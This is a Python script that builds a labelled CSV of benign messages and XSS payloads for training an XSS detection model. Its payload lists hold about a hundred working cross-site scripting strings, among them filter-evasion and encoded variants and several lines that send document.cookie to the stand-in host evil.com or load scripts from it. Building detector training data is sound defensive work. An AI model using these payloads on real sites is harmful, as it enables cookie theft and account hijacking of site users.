# generate_dataset.py
"""
Generate a sample XSS dataset for training
This creates a CSV file with both benign and malicious samples
"""

import csv
import random

# Benign (safe) inputs - label 0
benign_samples = [
    "Hello, how are you?",
    "Welcome to my profile!",
    "This is a great product",
    "Thanks for your help",
    "I love this website",
    "Check out my portfolio",
    "Contact me at email@example.com",
    "Looking forward to hearing from you",
    "Great work on the project!",
    "Have a wonderful day",
    "Please visit https://example.com for more info",
    "My favorite color is blue",
    "I'm interested in your services",
    "Can you help me with this?",
    "The meeting is scheduled for 3 PM",
    "Happy birthday! 🎉",
    "Congratulations on your achievement",
    "Nice to meet you",
    "Thank you for your feedback",
    "I agree with your point",
    "That's an interesting perspective",
    "Let me know if you need anything",
    "I'll get back to you soon",
    "Best regards",
    "Looking good!",
    "Great job everyone",
    "Keep up the good work",
    "See you tomorrow",
    "Have a safe trip",
    "Enjoy your weekend",
    "That sounds like a plan",
    "I appreciate your time",
    "Thanks for sharing",
    "This is very helpful",
    "Count me in!",
    "Sounds interesting",
    "I'd like to learn more",
    "Please send me details",
    "What a beautiful day",
    "Coffee time! ☕",
    "Just finished my workout",
    "Reading a great book",
    "My name is John Doe",
    "I work as a software engineer",
    "Based in New York",
    "Available for consultation",
    "Portfolio: www.example.com",
    "10 years of experience",
    "Specializing in web development",
    "Call me at 555-1234",
]

# Malicious XSS payloads - label 1
malicious_samples = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert('XSS')>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<div onmouseover=alert('XSS')>hover me</div>",
    "<a href='javascript:alert(1)'>click</a>",
    "javascript:alert('XSS')",
    "<script>eval('alert(1)')</script>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<object data='data:text/html,<script>alert(1)</script>'>",
    "<embed src='data:text/html,<script>alert(1)</script>'>",
    "<script src='http://evil.com/xss.js'></script>",
    "<script>fetch('http://evil.com?cookie='+document.cookie)</script>",
    "<img src='x' onerror='alert(document.domain)'>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mi xlink:href='javascript:alert(1)'>click</mi></math>",
    "<form action='javascript:alert(1)'><input type='submit'></form>",
    "<isindex type=image src=1 onerror=alert(1)>",
    "<input type='image' src=1 onerror=alert(1)>",
    "<link rel='stylesheet' href='javascript:alert(1)'>",
    "<style>@import'javascript:alert(1)';</style>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<base href='javascript:alert(1)//>",
    "<script>window.location='http://evil.com'</script>",
    "<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",
    "<iframe src='data:text/html,<script>alert(1)</script>'>",
    "<object data='javascript:alert(1)'>",
    "<embed code='javascript:alert(1)'>",
    "<img src='javascript:alert(1)'>",
    "<image src='javascript:alert(1)'>",
    "<video src=1 onerror=alert(1)>",
    "<audio src=1 onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onfinish=alert(1)>",
    "<marquee loop=1 onfinish=alert(1)>",
    "<script>localStorage.setItem('xss','stored')</script>",
    "<script>sessionStorage.setItem('xss','stored')</script>",
    "'-alert(1)-'",
    "\"><script>alert(1)</script>",
    "';alert(1);//",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<SCRipT>alert(1)</SCRipT>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>",
    "<img src='x' onerror='&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;'>",
    "<iframe src='javas&#99;ript:alert(1)'>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<img src=1 href=1 onerror='javascript:alert(1)'>",
    "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
    "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
    "<script>new Image().src='http://evil.com/log?'+document.cookie</script>",
    "<script>var i=new Image;i.src='http://evil.com/?'+document.cookie;</script>",
    "<<script>alert(1)//<</script>",
    "<script><!--alert(1)--></script>",
    "<script>/*alert(1)*/</script>",
    "<IMG SRC='javascript:alert(1)'>",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "<IMG SRC=`javascript:alert('XSS')`>",
    "<IMG DYNSRC='javascript:alert(1)'>",
    "<IMG LOWSRC='javascript:alert(1)'>",
    "<BGSOUND SRC='javascript:alert(1)'>",
    "<BR SIZE='&{alert(1)}'>",
    "<LAYER SRC='http://evil.com/xss.js'></LAYER>",
    "<LINK REL='stylesheet' HREF='javascript:alert(1)'>",
    "<DIV STYLE='background-image: url(javascript:alert(1))'>",
    "<DIV STYLE='width: expression(alert(1))'>",
    "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(1)';</STYLE>",
    "<IMG STYLE='xss:expr/*XSS*/ession(alert(1))'>",
    "<XSS STYLE='xss:expression(alert(1))'>",
    "<STYLE>.XSS{background-image:url('javascript:alert(1)');}</STYLE>",
    "<STYLE>li {list-style-image: url('javascript:alert(1)');}</STYLE><UL><LI>XSS",
    "<TABLE BACKGROUND='javascript:alert(1)'>",
    "<TABLE><TD BACKGROUND='javascript:alert(1)'>",
    "<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>",
    "<BODY ONLOAD=alert(1)>",
    "<BODY ONUNLOAD='alert(1)'>",
    "<BODY BACKGROUND='javascript:alert(1)'>",
    "<FRAMESET ONLOAD=alert(1)>",
    "<?xml version='1.0'?><script>alert(1)</script>",
    "<HTML xmlns:xss><?import namespace='xss' implementation='http://evil.com/xss.htc'><xss:xss>XSS</xss:xss></HTML>",
]

# Additional obfuscated/encoded samples
obfuscated_samples = [
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
    "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
    "<scr\\x00ipt>alert('XSS')</scr\\x00ipt>",
    "<img src=x onerror=\\u0061lert(1)>",
    "<iframe src=j&#97;vascript:alert(1)>",
    "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
    "<svg><script>alert&#40;1&#41;</script></svg>",
    "<img src='x' onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",
]

# Combine all malicious samples
all_malicious = malicious_samples + obfuscated_samples


def generate_dataset(filename='xss_dataset.csv', num_benign=1000, num_malicious=1000):
    """
    Generate a balanced dataset with benign and malicious samples
    Increased default size for better training
    """
    print(f"🔧 Generating XSS dataset: {filename}")
    print(f"   Benign samples: {num_benign}")
    print(f"   Malicious samples: {num_malicious}")
    
    dataset = []
    
    # Add benign samples (with repetition and variations)
    for i in range(num_benign):
        sample = random.choice(benign_samples)
        # Add some variations
        if random.random() > 0.7:
            variations = ["Thanks!", "😊", "Great!", "👍", "Awesome!", "Perfect!"]
            sample = sample + " " + random.choice(variations)
        dataset.append({'input': sample, 'label': 0})
    
    # Add malicious samples (with repetition if needed)
    for i in range(num_malicious):
        sample = random.choice(all_malicious)
        dataset.append({'input': sample, 'label': 1})
    
    # Shuffle dataset
    random.shuffle(dataset)
    
    # Write to CSV
    with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
        fieldnames = ['input', 'label']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        
        writer.writeheader()
        for row in dataset:
            writer.writerow(row)
    
    print(f"✅ Dataset generated successfully!")
    print(f"   Total samples: {len(dataset)}")
    print(f"   File saved: {filename}")
    
    # Show sample data
    print("\n📊 Sample entries:")
    print("-" * 80)
    for i, sample in enumerate(dataset[:5]):
        label_str = "SAFE" if sample['label'] == 0 else "MALICIOUS"
        print(f"{i+1}. [{label_str}] {sample['input'][:60]}...")
    print("-" * 80)


if __name__ == "__main__":
    print("="*80)
    print("📁 XSS Dataset Generator")
    print("="*80)
    print()
    
    # Generate larger dataset (2000 samples total) for better deep learning training
    generate_dataset('xss_dataset.csv', num_benign=1000, num_malicious=1000)
    
    print("\n💡 Next steps:")
    print("   1. For Random Forest: python xss_model_trainer.py")
    print("   2. For CNN-LSTM: python xss_cnn_lstm_trainer.py")
    print("   3. Then run the API: python app.py or python app_cnn_lstm.py")
    print("\n" + "="*80)